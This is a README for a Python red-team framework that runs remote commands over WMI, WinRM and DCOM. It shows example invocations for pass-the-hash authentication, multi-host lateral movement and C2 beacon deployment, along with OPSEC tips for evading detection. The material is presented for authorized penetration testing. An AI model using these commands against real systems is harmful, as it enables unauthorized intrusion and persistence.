# Remote Execution Framework

A professional, modular Python framework for remote command execution during authorized penetration testing and red team operations.

> ⚠️ **LEGAL DISCLAIMER**: This tool is intended for authorized security testing only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.

## Features

- **Multiple Execution Methods**: WMI, PSRemoting (WinRM), DCOM
- **Multi-Target Execution**: Automated lateral movement
- **Beacon Deployment**: Copy and execute C2 beacons
- **Interactive Sessions**: Full PowerShell via evil-winrm
- **Dual Authentication**: Password and NTLM hash support
- **Professional Reporting**: JSON reports with detailed results
- **Modular Architecture**: Easy to extend with new methods

## Installation

```bash
# Clone the repository
git clone https://github.com/maxwellcross/remote-exec-framework.git
cd remote-exec-framework

# Install dependencies
pip install -r requirements.txt
```

### Dependencies

- Python 3.8+
- Impacket (for WMI/DCOM methods)
- evil-winrm (for PSRemoting)
- smbclient (for beacon deployment)

## Quick Start

### Command Line

```bash
# WMI execution with password
python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --method wmi --command "whoami"

# WMI execution with hash
python -m remote_exec_framework --target 192.168.1.100 --username admin --hash aad3b435... --method wmi

# PSRemoting interactive session
python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --interactive

# DCOM execution
python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --method dcom --command "calc.exe"

# Multi-target execution
python -m remote_exec_framework --targets-file hosts.txt --username admin --password Pass123 --command "hostname"

# Deploy beacon
python -m remote_exec_framework --target 192.168.1.100 --username admin --password Pass123 --deploy-beacon beacon.exe --method wmi
```

### Python API

```python
from remote_exec_framework import RemoteExecutionFramework, Credential

# Initialize framework
framework = RemoteExecutionFramework()

# Create credential (password auth)
credential = Credential(
    username="admin",
    password="Pass123",
    domain="CORP"
)

# Or with hash
credential_hash = Credential(
    username="admin",
    ntlm_hash="aad3b435b51404eeaad3b435b51404ee",
    domain="CORP"
)

# Single target execution
result = framework.execute(
    target="192.168.1.100",
    credential=credential,
    command="whoami /all",
    method="wmi"
)

# Multi-target execution
results = framework.execute_on_multiple(
    targets=["192.168.1.100", "192.168.1.101", "192.168.1.102"],
    credential=credential,
    command="hostname",
    method="wmi"
)

# Interactive PSRemoting session
framework.interactive_session("192.168.1.100", credential)

# Deploy beacon
result = framework.deploy_beacon(
    target="192.168.1.100",
    credential=credential,
    beacon_path="/tmp/beacon.exe",
    method="wmi"
)

# Generate report
framework.generate_report()
```

## Execution Methods

### WMI (Impacket wmiexec)

Primary method for stealthy remote execution.

```bash
python -m remote_exec_framework -t 192.168.1.100 -u admin -p Pass123 --method wmi -x "ipconfig"
```

**Advantages:**
- No service installation
- Supports both password and hash
- Uses legitimate Windows interface

**OPSEC:** Creates process on target, logged in Event ID 4688.

### PSRemoting (evil-winrm)

Full PowerShell via WinRM.

```bash
# Non-interactive
python -m remote_exec_framework -t 192.168.1.100 -u admin -p Pass123 --method psremoting -x "Get-Process"

# Interactive
python -m remote_exec_framework -t 192.168.1.100 -u admin -p Pass123 --interactive
```

**Advantages:**
- Full PowerShell capabilities
- Interactive session support
- Upload/download built-in

**OPSEC:** Requires password. Script block logging captures commands.

### DCOM (Impacket dcomexec)

Alternative to WMI using Distributed COM.

```bash
python -m remote_exec_framework -t 192.168.1.100 -u admin -p Pass123 --method dcom -x "calc.exe"
```

**Advantages:**
- Alternative when WMI is blocked
- May bypass WMI-focused monitoring

**OPSEC:** Increasingly monitored. Try different COM objects if blocked.

## Beacon Deployment

Two-stage deployment: Copy via SMB, Execute via chosen method.

```python
result = framework.deploy_beacon(
    target="192.168.1.100",
    credential=credential,
    beacon_path="/tmp/beacon.exe",
    method="wmi"
)

print(f"Copy success: {result.copy_success}")
print(f"Exec success: {result.exec_success}")
```

**OPSEC Considerations:**
- Beacon lands on disk in `C:\Windows\Temp\`
- SMB file copy is logged
- Consider fileless alternatives for mature environments

## Project Structure

```
remote_exec_framework/
├── __init__.py          # Package exports and version
├── __main__.py          # CLI entry point
├── core/
│   ├── __init__.py
│   ├── models.py        # Dataclasses and enums
│   └── framework.py     # Main orchestrator
├── methods/
│   ├── __init__.py      # Method factory
│   ├── base.py          # Abstract base class
│   ├── wmi.py           # WMI execution
│   ├── psremoting.py    # PSRemoting execution
│   ├── dcom.py          # DCOM execution
│   └── beacon.py        # Beacon deployment
├── reports/
│   ├── __init__.py
│   └── generator.py     # Report generation
└── utils/
    ├── __init__.py
    ├── output.py        # Console output handling
    ├── executor.py      # Command execution
    └── files.py         # File utilities
```

## Authentication

### Password Authentication

```python
credential = Credential(
    username="admin",
    password="Pass123",
    domain="CORP"
)
```

### Hash Authentication

```python
credential = Credential(
    username="admin",
    ntlm_hash="aad3b435b51404eeaad3b435b51404ee",
    domain="CORP"
)
```

**Note:** PSRemoting (evil-winrm) requires password authentication.

## OPSEC Considerations

| Method | Noise Level | Auth Types | Artifacts |
|--------|-------------|------------|-----------|
| WMI | Low | Pass/Hash | Process creation |
| PSRemoting | Medium | Password | Script block logs |
| DCOM | Low-Medium | Pass/Hash | COM activity |

### Detection Events

- **WMI**: Event ID 4688 (Process Creation)
- **PSRemoting**: Event ID 400/403 (Engine Lifecycle), Script Block Logging
- **DCOM**: COM object instantiation logs

## Extending the Framework

### Adding New Execution Method

1. Create new file in `methods/`:

```python
from .base import BaseExecutionMethod
from ..core.models import ExecutionMethod, Credential

class NewExecutionMethod(BaseExecutionMethod):
    method = ExecutionMethod.NEW_METHOD
    supports_hash = True
    supports_password = True
    
    def build_command(self, target, credential, command):
        return f"newtool {target} -u {credential.username} -c '{command}'"
    
    def parse_output(self, output_text, stderr):
        if 'success' in output_text:
            return True, None
        return False, "Execution failed"
```

2. Register in `methods/__init__.py`:

```python
METHOD_REGISTRY['newmethod'] = NewExecutionMethod
```

## Author

**Maxwell Cross** - Red Team Operator & Security Researcher

## License

For authorized security testing only. See LICENSE for details.